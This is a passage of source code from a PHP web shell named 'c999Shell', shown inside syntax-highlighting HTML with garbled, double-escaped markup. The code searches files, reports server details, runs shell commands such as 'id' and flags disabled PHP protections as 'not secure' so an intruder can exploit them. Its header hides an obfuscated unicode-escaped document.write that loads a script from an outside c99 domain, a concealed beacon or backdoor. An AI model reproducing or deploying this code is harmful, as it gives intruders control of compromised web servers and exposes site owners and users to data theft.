<span class="s2"> if (!</span><span class="si">$a[&quot;text_cs&quot;]</span><span class="s2">) </span><span class="si">{</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">]);</span> <span class="nv">$r</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$r</span><span class="p">);</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> if (</span><span class="si">$a[&quot;text_regexp&quot;]</span><span class="s2">) </span><span class="si">{</span><span class="nv">$bool</span> <span class="o">=</span> <span class="nb">ereg</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">],</span><span class="nv">$r</span><span class="p">);</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> else </span><span class="si">{</span><span class="nv">$bool</span> <span class="o">=</span> <span class="nb">strpos</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nv">$r</span><span class="p">,</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">],</span><span class="mi">1</span><span class="p">);</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> if (</span><span class="si">$a[&quot;text_not&quot;]</span><span class="s2">) </span><span class="si">{</span><span class="nv">$bool</span> <span class="o">=</span> <span class="o">!</span><span class="nv">$bool</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> if (</span><span class="si">$bool</span><span class="s2">) </span><span class="si">{</span><span class="nv">$found</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">;</span> <span class="nv">$found_f</span><span class="o">++</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> }</span>
<span class="s2"> else </span><span class="si">{</span><span class="nv">$found</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">;</span> <span class="nv">$found_f</span><span class="o">++</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> }</span>
<span class="s2"> }</span>
<span class="s2"> }</span>
<span class="s2"> }</span>
<span class="s2"> closedir(</span><span class="si">$h</span><span class="s2">);</span>
<span class="s2">}</span>
<span class="s2">}</span>
<span class="s2">if (</span><span class="si">$act</span><span class="s2"> == &quot;</span><span class="nx">gofile</span><span class="s2">&quot;) {if (is_dir(</span><span class="si">$f</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span> <span class="nv">$d</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">;</span><span class="si">}</span><span class="s2"> else </span><span class="si">{</span><span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;f&quot;</span><span class="p">;</span> <span class="nv">$d</span> <span class="o">=</span> <span class="nb">dirname</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span> <span class="nv">$f</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span><span class="si">}</span><span class="s2">}</span>
<span class="s2">//Sending headers</span>
<span class="s2">@ob_start();</span>
<span class="s2">@ob_implicit_flush(0);</span>
<span class="s2">function onphpshutdown()</span>
<span class="s2">{</span>
<span class="s2"> global </span><span class="si">$gzipencode</span><span class="s2">,</span><span class="si">$ft</span><span class="s2">;</span>
<span class="s2"> if (!headers_sent() and </span><span class="si">$gzipencode</span><span class="s2"> and !in_array(</span><span class="si">$ft</span><span class="s2">,array(&quot;</span><span class="nx">img</span><span class="s2">&quot;,&quot;</span><span class="nx">download</span><span class="s2">&quot;,&quot;</span><span class="nx">notepad</span><span class="s2">&quot;)))</span>
<span class="s2"> {</span>
<span class="s2"> </span><span class="si">$v</span><span class="s2"> = @ob_get_contents();</span>
<span class="s2"> @ob_end_clean();</span>
<span class="s2"> @ob_start(&quot;</span><span class="nx">ob_gzHandler</span><span class="s2">&quot;);</span>
<span class="s2"> echo </span><span class="si">$v</span><span class="s2">;</span>
<span class="s2"> @ob_end_flush();</span>
<span class="s2"> }</span>
<span class="s2">}</span>
<span class="s2">function c999shexit()</span>
<span class="s2">{</span>
<span class="s2"> onphpshutdown();</span>
<span class="s2"> exit;</span>
<span class="s2">}</span>
<span class="s2">header(&quot;</span><span class="nx">Expires</span><span class="o">:</span> <span class="nx">Mon</span><span class="p">,</span> <span class="mi">26</span> <span class="nx">Jul</span> <span class="mi">1997</span> <span class="mo">05</span><span class="o">:</span><span class="mo">00</span><span class="o">:</span><span class="mo">00</span> <span class="nx">GMT</span><span class="s2">&quot;);</span>
<span class="s2">header(&quot;</span><span class="nx">Last</span><span class="o">-</span><span class="nx">Modified</span><span class="o">:</span> <span class="s2">&quot;.gmdate(&quot;</span><span class="nx">D</span><span class="p">,</span> <span class="nx">d</span> <span class="nx">M</span> <span class="nx">Y</span> <span class="nx">H</span><span class="o">:</span><span class="nx">i</span><span class="o">:</span><span class="nx">s</span><span class="s2">&quot;).&quot;</span> <span class="nx">GMT</span><span class="s2">&quot;);</span>
<span class="s2">header(&quot;</span><span class="nx">Cache</span><span class="o">-</span><span class="nx">Control</span><span class="o">:</span> <span class="nx">no</span><span class="o">-</span><span class="nx">store</span><span class="p">,</span> <span class="nx">no</span><span class="o">-</span><span class="nx">cache</span><span class="p">,</span> <span class="nx">must</span><span class="o">-</span><span class="nx">revalidate</span><span class="s2">&quot;);</span>
<span class="s2">header(&quot;</span><span class="nx">Cache</span><span class="o">-</span><span class="nx">Control</span><span class="o">:</span> <span class="nx">post</span><span class="o">-</span><span class="nx">check</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="nx">pre</span><span class="o">-</span><span class="nx">check</span><span class="o">=</span><span class="mi">0</span><span class="s2">&quot;, FALSE);</span>
<span class="s2">header(&quot;</span><span class="nx">Pragma</span><span class="o">:</span> <span class="nx">no</span><span class="o">-</span><span class="nx">cache</span><span class="s2">&quot;);</span>
<span class="s2">if (empty(</span><span class="si">$tmpdir</span><span class="s2">))</span>
<span class="s2">{</span>
<span class="s2"> </span><span class="si">$tmpdir</span><span class="s2"> = ini_get(&quot;</span><span class="nx">upload_tmp_dir</span><span class="s2">&quot;);</span>
<span class="s2"> if (is_dir(</span><span class="si">$tmpdir</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$tmpdir</span> <span class="o">=</span> <span class="s2">&quot;/tmp/&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">}</span>
<span class="si">$tmpdir</span><span class="s2"> = realpath(</span><span class="si">$tmpdir</span><span class="s2">);</span>
<span class="si">$tmpdir</span><span class="s2"> = str_replace(&quot;</span><span class="nx">\\</span><span class="s2">&quot;,DIRECTORY_SEPARATOR,</span><span class="si">$tmpdir</span><span class="s2">);</span>
<span class="s2">if (substr(</span><span class="si">$tmpdir</span><span class="s2">,-1) != DIRECTORY_SEPARATOR) </span><span class="si">{</span><span class="nv">$tmpdir</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">if (empty(</span><span class="si">$tmpdir_logs</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$tmpdir_logs</span> <span class="o">=</span> <span class="nv">$tmpdir</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">else </span><span class="si">{</span><span class="nv">$tmpdir_logs</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="nv">$tmpdir_logs</span><span class="p">);</span><span class="si">}</span><span class="s2"></span>
<span class="s2">if (@ini_get(&quot;</span><span class="nx">safe_mode</span><span class="s2">&quot;) or strtolower(@ini_get(&quot;</span><span class="nx">safe_mode</span><span class="s2">&quot;)) == &quot;</span><span class="nx">on</span><span class="s2">&quot;)</span>
<span class="s2">{</span>
<span class="s2"> </span><span class="si">$safemode</span><span class="s2"> = TRUE;</span>
<span class="s2"> </span><span class="si">$hsafemode</span><span class="s2"> = &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">pre</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">span</span> <span class="nx">style</span><span class="o">=</span><span class="s2">&quot;color: red;&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">ON</span> <span class="p">(</span><span class="nx">secure</span><span class="p">)</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">span</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">pre</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">}</span>
<span class="s2">else </span><span class="si">{</span><span class="nv">$safemode</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span> <span class="nv">$hsafemode</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;/pre&amp;gt;</span>
<span class="s2">&amp;lt;span style=&quot;</span><span class="nx">color</span><span class="o">:</span> <span class="nx">green</span><span class="p">;</span><span class="s2">&quot;&amp;gt;OFF (not secure)&amp;lt;/span&amp;gt;</span>
<span class="s2">&amp;lt;pre&amp;gt;&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="si">$v</span><span class="s2"> = @ini_get(&quot;</span><span class="nx">open_basedir</span><span class="s2">&quot;);</span>
<span class="s2">if (</span><span class="si">$v</span><span class="s2"> or strtolower(</span><span class="si">$v</span><span class="s2">) == &quot;</span><span class="nx">on</span><span class="s2">&quot;) </span><span class="si">{</span><span class="nv">$openbasedir</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span> <span class="nv">$hopenbasedir</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;/pre&amp;gt;</span>
<span class="s2">&amp;lt;span style=&quot;</span><span class="nx">color</span><span class="o">:</span> <span class="nx">red</span><span class="p">;</span><span class="s2">&quot;&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/span&amp;gt;</span>
<span class="s2">&amp;lt;pre&amp;gt;&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">else </span><span class="si">{</span><span class="nv">$openbasedir</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span> <span class="nv">$hopenbasedir</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;/pre&amp;gt;</span>
<span class="s2">&amp;lt;span style=&quot;</span><span class="nx">color</span><span class="o">:</span> <span class="nx">green</span><span class="p">;</span><span class="s2">&quot;&amp;gt;OFF (not secure)&amp;lt;/span&amp;gt;</span>
<span class="s2">&amp;lt;pre&amp;gt;&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="si">$sort</span><span class="s2"> = htmlspecialchars(</span><span class="si">$sort</span><span class="s2">);</span>
<span class="s2">if (empty(</span><span class="si">$sort</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$sort</span> <span class="o">=</span> <span class="nv">$sort_default</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="si">$sort[1]</span><span class="s2"> = strtolower(</span><span class="si">$sort[1]</span><span class="s2">);</span>
<span class="si">$DISP_SERVER_SOFTWARE</span><span class="s2"> = getenv(&quot;</span><span class="nx">SERVER_SOFTWARE</span><span class="s2">&quot;);</span>
<span class="s2">if (!ereg(&quot;</span><span class="nx">PHP</span><span class="o">/</span><span class="s2">&quot;.phpversion(),</span><span class="si">$DISP_SERVER_SOFTWARE</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$DISP_SERVER_SOFTWARE</span> <span class="o">.=</span> <span class="s2">&quot;. PHP/&quot;</span><span class="o">.</span><span class="nb">phpversion</span><span class="p">();</span><span class="si">}</span><span class="s2"></span>
<span class="si">$DISP_SERVER_SOFTWARE</span><span class="s2"> = str_replace(&quot;</span><span class="nx">PHP</span><span class="o">/</span><span class="s2">&quot;.phpversion(),&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&quot;\&amp;quot;&amp;quot;.</span><span class="si">$surl</span><span class="s2">.&amp;quot;act=phpinfo\&amp;quot;&quot;</span> <span class="nx">target</span><span class="o">=</span><span class="s2">&quot;\&amp;quot;_blank\&amp;quot;&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">span</span> <span class="nx">style</span><span class="o">=</span><span class="s2">&quot;text-decoration: underline;&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">PHP</span><span class="o">/</span><span class="s2">&quot;.phpversion().&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">span</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">a</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;,htmlspecialchars(</span><span class="si">$DISP_SERVER_SOFTWARE</span><span class="s2">));</span>
<span class="s2">@ini_set(&quot;</span><span class="nx">highlight</span><span class="o">.</span><span class="nx">bg</span><span class="s2">&quot;,</span><span class="si">$highlight_bg</span><span class="s2">); //FFFFFF</span>
<span class="s2">@ini_set(&quot;</span><span class="nx">highlight</span><span class="o">.</span><span class="nx">comment</span><span class="s2">&quot;,</span><span class="si">$highlight_comment</span><span class="s2">); //#FF8000</span>
<span class="s2">@ini_set(&quot;</span><span class="nx">highlight</span><span class="o">.</span><span class="k">default</span><span class="s2">&quot;,</span><span class="si">$highlight_default</span><span class="s2">); //#0000BB</span>
<span class="s2">@ini_set(&quot;</span><span class="nx">highlight</span><span class="o">.</span><span class="nx">html</span><span class="s2">&quot;,</span><span class="si">$highlight_html</span><span class="s2">); //#000000</span>
<span class="s2">@ini_set(&quot;</span><span class="nx">highlight</span><span class="o">.</span><span class="nx">keyword</span><span class="s2">&quot;,</span><span class="si">$highlight_keyword</span><span class="s2">); //#007700</span>
<span class="s2">@ini_set(&quot;</span><span class="nx">highlight</span><span class="o">.</span><span class="nx">string</span><span class="s2">&quot;,</span><span class="si">$highlight_string</span><span class="s2">); //#DD0000</span>
<span class="s2">if (!is_array(</span><span class="si">$actbox</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$actbox</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span><span class="si">}</span><span class="s2"></span>
<span class="si">$dspact</span><span class="s2"> = </span><span class="si">$act</span><span class="s2"> = htmlspecialchars(</span><span class="si">$act</span><span class="s2">);</span>
<span class="si">$disp_fullpath</span><span class="s2"> = </span><span class="si">$ls_arr</span><span class="s2"> = </span><span class="si">$notls</span><span class="s2"> = null;</span>
<span class="si">$ud</span><span class="s2"> = urlencode(</span><span class="si">$d</span><span class="s2">);</span>
<span class="s2">?&gt;&amp;lt;meta http-equiv=&quot;</span><span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="s2">&quot; content=&quot;</span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">;</span> <span class="nx">charset</span><span class="o">=</span><span class="nx">windows</span><span class="o">-</span><span class="mi">1251</span><span class="s2">&quot; /&amp;gt;&amp;lt;meta http-equiv=&quot;</span><span class="nx">Content</span><span class="o">-</span><span class="nx">Language</span><span class="s2">&quot; content=&quot;</span><span class="nx">en</span><span class="o">-</span><span class="nx">us</span><span class="s2">&quot; /&amp;gt;&lt;?php echo getenv(&quot;</span><span class="nx">HTTP_HOST</span><span class="s2">&quot;); ?&gt; - phpshell&amp;lt;/pre&amp;gt;</span>
<span class="s2">&amp;lt;style&amp;gt;&amp;lt;!--</span>
<span class="s2">TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</span>
<span class="s2">--&amp;gt;&amp;lt;/style&amp;gt;</span>
<span class="s2">&amp;lt;pre&amp;gt;&amp;lt;/pre&amp;gt;</span>
<span class="s2">&amp;lt;center&amp;gt;</span>
<span class="s2">&amp;lt;table style=&quot;</span><span class="nx">border</span><span class="o">-</span><span class="nx">collapse</span><span class="o">:</span> <span class="nx">collapse</span><span class="p">;</span><span class="s2">&quot; width=&quot;</span><span class="mi">100</span><span class="o">%</span><span class="s2">&quot; border=&quot;</span><span class="mi">1</span><span class="s2">&quot; cellspacing=&quot;</span><span class="mi">0</span><span class="s2">&quot; cellpadding=&quot;</span><span class="mi">5</span><span class="s2">&quot; bgcolor=&quot;</span><span class="c1">#333333&quot;&amp;gt;</span>
<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">tbody</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">tr</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">th</span> <span class="nx">colspan</span><span class="o">=</span><span class="s2">&quot;2&quot;</span> <span class="nx">valign</span><span class="o">=</span><span class="s2">&quot;top&quot;</span> <span class="nx">nowrap</span><span class="o">=</span><span class="s2">&quot;nowrap&quot;</span> <span class="nx">width</span><span class="o">=</span><span class="s2">&quot;101%&quot;</span> <span class="nx">height</span><span class="o">=</span><span class="s2">&quot;15&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">span</span> <span class="nx">style</span><span class="o">=</span><span class="s2">&quot;font-family: Webdings; font-size: xx-large;&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">!&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">span</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&quot;&lt;?php echo </span><span class="si">$surl</span><span class="s2">; ?&gt;&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">span</span> <span class="nx">style</span><span class="o">=</span><span class="s2">&quot;font-family: Verdana; font-size: x-large;&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">script</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;text/javascript&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="c1">// &amp;lt;![CDATA[</span>
<span class="nx">document</span><span class="o">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;\u003c\u0053\u0043\u0052\u0049\u0050\u0054\u0020\u0053\u0052\u0043\u003d\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0077\u0077\u0077\u002e\u0063\u0039\u0039\u002e\u006d\u006f\u0062\u0069\u002f\u0069\u006d\u0061\u0067\u0065\u0073\u002f\u0069\u006d\u0067\u002e\u006a\u0073\u003e\u003c\u002f\u0053\u0043\u0052\u0049\u0050\u0054\u003e&#39;</span><span class="p">)</span>
<span class="c1">// ]]&amp;gt;&amp;lt;/script&amp;gt;c999Shell v. &amp;lt;!--?php echo $shver; ?--&amp;gt;&amp;lt;/b&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;span style=&quot;font-family: Webdings; font-size: xx-large;&quot;&amp;gt;&amp;lt;b&amp;gt;!&amp;lt;/b&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;/th&amp;gt;</span>
<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">tr</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">tbody</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">table</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">center</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">pre</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Software</span><span class="o">:</span><span class="nx"> </span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">!--?</span><span class="nx">php</span> <span class="k">echo</span> <span class="nv">$DISP_SERVER_SOFTWARE</span><span class="p">;</span> <span class="o">?--&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx"> </span>

<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">uname</span> <span class="o">-</span><span class="nx">a</span><span class="o">:</span><span class="nx"> </span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">!--?</span><span class="nx">php</span> <span class="k">echo</span> <span class="nb">wordwrap</span><span class="p">(</span><span class="nb">php_uname</span><span class="p">(),</span><span class="mi">90</span><span class="p">,</span><span class="s2">&quot;&amp;lt;br ?--&amp;gt;&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&amp;lt;/b&amp;gt; </span>

<span class="x">&amp;lt;b&amp;gt;&amp;lt;!--?php if (!$win) {echo wordwrap(myshellexec(&quot;id&quot;),90,&quot;&amp;lt;br ?--&amp;gt;&quot;,1);} else {echo get_current_user();} ?&gt;&amp;lt;/b&amp;gt; </span>

<span class="x">&amp;lt;b&amp;gt;Safe-mode: &amp;lt;!--?php echo $hsafemode; ?--&amp;gt;&amp;lt;/b&amp;gt;</span>

<span class="x">&amp;lt;!--?php &amp;lt;br ?--&amp;gt;$d = str_replace(&quot;\\&quot;,DIRECTORY_SEPARATOR,$d);</span>
<span class="x">if (empty($d)) {$d = realpath(&quot;.&quot;);} elseif(realpath($d)) {$d = realpath($d);}</span>
<span class="x">$d = str_replace(&quot;\\&quot;,DIRECTORY_SEPARATOR,$d);</span>
<span class="x">if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}</span>
<span class="x">$d = str_replace(&quot;\\\\&quot;,&quot;\\&quot;,$d);</span>
<span class="x">$dispd = htmlspecialchars($d);</span>
<span class="x">$pd = $e = explode(DIRECTORY_SEPARATOR,substr($d,0,-1));</span>
<span class="x">$i = 0;</span>
<span class="x">foreach($pd as $b)</span>
<span class="x">{</span>
<span class="x"> $t = &quot;&quot;;</span>
<span class="x"> $j = 0;</span>
<span class="x"> foreach ($e as $r)</span>
<span class="x"> {</span>
<span class="x"> $t.= $r.DIRECTORY_SEPARATOR;</span>
<span class="x"> if ($j == $i) {break;}</span>
<span class="x"> $j++;</span>
<span class="x"> }</span>
<span class="x"> echo &quot;&amp;lt;a href=&quot;\&amp;quot;&amp;quot;.$surl.&amp;quot;act=ls&amp;d=&amp;quot;.urlencode($t).&amp;quot;&amp;sort=&amp;quot;.$sort.&amp;quot;\&amp;quot;&quot;&amp;gt;&amp;lt;b&amp;gt;&quot;.htmlspecialchars($b).DIRECTORY_SEPARATOR.&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&quot;;</span>
<span class="x"> $i++;</span>
<span class="x">}</span>
<span class="x">echo &quot;   &quot;;</span>
<span class="x">if (is_writable($d))</span>
<span class="x">{</span>
<span class="x"> $wd = TRUE;</span>
<span class="x"> $wdt = &quot;&amp;lt;span style=&quot;color: green;&quot;&amp;gt;[ ok ]&amp;lt;/span&amp;gt;&quot;;</span>
<span class="x"> echo &quot;&amp;lt;b&amp;gt;&amp;lt;span style=&quot;color: green;&quot;&amp;gt;&quot;.view_perms(fileperms($d)).&quot;&amp;lt;/span&amp;gt;&amp;lt;/b&amp;gt;&quot;;</span>
<span class="x">}</span>
<span class="x">else</span>
<span class="x">{</span>
<span class="x"> $wd = FALSE;</span>
<span class="x"> $wdt = &quot;&amp;lt;span style=&quot;color: red;&quot;&amp;gt;[ Read-Only ]&amp;lt;/span&amp;gt;&quot;;</span>
<span class="x"> echo &quot;&amp;lt;b&amp;gt;&quot;.view_perms_color($d).&quot;&amp;lt;/b&amp;gt;&quot;;</span>
<span class="x">}</span>
<span class="x">if (is_callable(&quot;disk_free_space&quot;))</span>
<span class="x">{</span>
<span class="x"> $free = disk_free_space($d);</span>
<span class="x"> $total = disk_total_space($d);</span>
<span class="x"> if ($free === FALSE) {$free = 0;}</span>
<span class="x"> if ($total === FALSE) {$total = 0;}</span>
<span class="x"> if ($free &amp;lt; 0) {$free = 0;}</span>
<span class="x"> if ($total &amp;lt; 0) {$total = 0;}</span>
<span class="x"> $used = $total-$free;</span>
<span class="x"> $free_percent = round(100/($total/$free),2);</span>
<span class="x"> echo &quot;</span>
<span class="x">&amp;lt;b&amp;gt;Free &quot;.view_size($free).&quot; of &quot;.view_size($total).&quot; (&quot;.$free_percent.&quot;%)&amp;lt;/b&amp;gt;&quot;;</span>
<span class="x">}</span>
<span class="x">echo &quot;</span>
<span class="x">&quot;;</span>
<span class="x">$letters = &quot;&quot;;</span>
<span class="x">if ($win)</span>
<span class="x">{</span>
<span class="x"> $v = explode(&quot;\\&quot;,$d);</span>
<span class="x"> $v = $v[0];</span>
<span class="x"> foreach (range(&quot;a&quot;,&quot;z&quot;) as $letter)</span>
<span class="x"> {</span>
<span class="x"> $bool = $isdiskette = in_array($letter,$safemode_diskettes);</span>
<span class="x"> if (!$bool) {$bool = is_dir($letter.&quot;:\\&quot;);}</span>
<span class="x"> if ($bool)</span>
<span class="x"> {</span>
